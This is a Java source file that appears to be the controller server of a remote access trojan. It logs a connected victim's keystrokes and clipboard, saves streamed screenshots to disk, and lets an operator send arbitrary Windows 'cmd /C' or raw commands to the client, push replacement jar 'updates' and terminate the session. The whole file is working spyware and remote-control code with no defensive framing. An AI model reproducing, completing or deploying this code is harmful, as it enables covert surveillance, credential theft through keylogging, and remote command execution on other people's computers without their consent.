/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jul.server;

import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import static jul.server.CommonUtils.*;
import static jul.server.ConstantCodes.*;

public class JULServer {

    private static OutputStream clientOut;
    private static ObjectInputStream objectInputStream;
    private static ImageIcon lastScreneCap;
    public static BufferedImage lastRenderedScreneCap;
    
    private static BufferedWriter bw;

    public static Socket clientSocket;

    private static int imageIndex = 1;

    public static void main(String[] args) throws Exception {
        int portnumber = 8080;
        ServerSocket serverSocket = new ServerSocket(portnumber);
        new Thread(new Runnable() {
            @Override
            public void run() {
                JULServer.waitForExit();
            }
        }).start();
        File logdir = new File(System.getProperty("user.home"), "cblogs");
        if (!logdir.exists()) {
            System.out.println("Creating log directory at: " + logdir);
            logdir.mkdir();
            System.out.println("Directory created.");
        } else {
            System.out.println("Directory log already exists, continuing.");
        }
        
        String logts = new SimpleDateFormat("'CBLog' MMddyy kkmm'.txt'").format(new Date());
        File log = new File(logdir + File.separator + logts);
        if (!log.exists()) {
            log.createNewFile();
	}
        
        File screneCapLog = new File(logdir + File.separator + logts);
        
        FileWriter fw = new FileWriter(log.getAbsoluteFile());
	bw = new BufferedWriter(fw);
        
        
        System.out.println("waiting for client to accept.");
        clientSocket = serverSocket.accept();
        InputStream in = clientSocket.getInputStream();
        clientOut = clientSocket.getOutputStream();
        ViewingScrene.initViewingScrene();
        System.out.println("Waiting for first msg.");
        int type = in.read();
        int dataParam;
        while (type != -1) {
            switch ((byte) type) {
                case CLIPBOARD_DATA:
                    String clipboard = readOffString(in);
                    logString("The clipboard sent was: " + clipboard.toString());
                    break;
                case KEY_PRESSED_CODE:
                    dataParam = readOffInt(in);
                    logString("The user pressed the key: " + ((char) dataParam));
                    break;
                case KEY_RELEASED_CODE:
                    dataParam = readOffInt(in);
                    logString("The user released the key: " + ((char) dataParam));
                    break;
                case KEY_TYPED_CODE:
                    dataParam = readOffInt(in);
                    logString("The user typed the key: " + ((char) dataParam));
                    break;
                case SCRENECAP_STREAM_INIT:
                    logString("A screne cap strem is being set up.");
                    objectInputStream = new ObjectInputStream(in);
                    logString("A screne cap was sent.");
                    lastScreneCap = (ImageIcon) objectInputStream.readObject();
                    objectInputStream = null;
                    logts = new SimpleDateFormat("'CBLog' MMddyy kk:mm:ss").format(new Date());
                    saveImage(lastScreneCap, logdir + File.separator + "screnecap_at_" + logts + ".png");
                    ViewingScrene.getViewingScrene().update();
                    break;
                case SEND_VERSION:
                    dataParam = in.read();
                    logString("A version number was sent: " + dataParam);
                    break;
                case EXECUTING_NATIVE_COMMAND:
                    logString("The client has responded that it is executing a native command.");
                    break;

            }
            type = in.read();
            //System.out.println("next type processed and was: " + type);
        }

    }

    public static void waitForExit() {
        Scanner usrin = new Scanner(System.in);
        while (true) {
            String commandLine = usrin.nextLine();
            String[] commandParts = commandLine.split(" ");
            String command = commandParts[0];
            if (command.equals("kill") || command.equals("quit")) {
                try {
                    logString("terminating client and server");
                    clientOut.write(TERMINATE_SESSION);
                    Thread.sleep(100);
                    System.exit(0);
                } catch (IOException ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                } catch (InterruptedException ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            } else if (command.equals("update")) {
                try {
                    logString("Sending update to client");
                    RandomAccessFile f = new RandomAccessFile("./JUL-update.jar", "r");
                    byte[] bytes = new byte[(int) f.length()];
                    f.read(bytes);
                    clientOut.write(UPDATE_PACKAGE);
                    clientOut.write(ByteBuffer.allocate(Integer.BYTES).putInt((int) f.length()).array());
                    clientOut.write(bytes);
                    System.exit(0);
                } catch (Exception ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            } else if (command.equals("version")) {
                try {
                    clientOut.write(REQUEST_VERSION);
                } catch (Exception ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            } else if (command.equals("exec") || command.equals("execute")) {
                try {
                    String cmdTosend = "cmd /C " + commandLine.replace(command + " ", "");
                    logString("sending exec command: " + cmdTosend);
                    clientOut.write(EXEC_NATIVE_COMMAND);
                    writeString(cmdTosend, clientOut);
                } catch (Exception ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                }
            } else if (command.equals("exec_raw") || command.equals("er")) {
                try {
                    String cmdTosend = commandLine.replace(command + " ", "");
                    logString("sending exec command: " + cmdTosend);
                    clientOut.write(EXEC_NATIVE_COMMAND);
                    writeString(cmdTosend, clientOut);
                } catch (Exception ex) {
                    Logger.getLogger(JULServer.class.getName()).log(Level.SEVERE, null, ex);
                } 
            } else {
                System.out.println("No such command: " + command);
            }

        }
    }

    private static int encryptionIndex = 0;

    public static byte decrypt(byte b) {
        encryptionIndex = (encryptionIndex + 1) % encryptionKey.length;
        return (byte) (b ^ encryptionKey[encryptionIndex]);
    }

    public static byte[] decrypt(byte[] barr) {
        byte[] result = new byte[barr.length];
        for (int i = 0; i < barr.length; i++) {
            result[i] = decrypt(barr[i]);
        }
        return result;
    }

    BufferedImage bi;

    private static void saveImage(ImageIcon img, String path) throws IOException {
        File outputfile = new File(path);
        ImageIO.write(toBufferedImage(img.getImage()), "png", outputfile);
    }

    public static BufferedImage toBufferedImage(Image img) {
        if (img instanceof BufferedImage) {
            return (BufferedImage) img;
        }

        // Create a buffered image with transparency
        lastRenderedScreneCap = new BufferedImage(img.getWidth(null), img.getHeight(null), BufferedImage.TYPE_INT_ARGB);

        // Draw the image on to the buffered image
        Graphics2D bGr = lastRenderedScreneCap.createGraphics();
        bGr.drawImage(img, 0, 0, null);
        bGr.dispose();

        // Return the buffered image
        return lastRenderedScreneCap;
    }

    private static String readOffString(InputStream inputStream) throws IOException {
        int length = readOffInt(inputStream);
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < length; i++) {
            result.append((char) inputStream.read());
        }
        return result.toString();
    }

    private static void writeString(String s, OutputStream out) throws IOException {
        out.write(ByteBuffer.allocate(4).putInt(s.length()).array());
        out.write(s.getBytes());
    }
    
    private static void logString(String s) throws IOException {
        System.out.println(s);
        bw.write(s);
        bw.flush();
    }
}
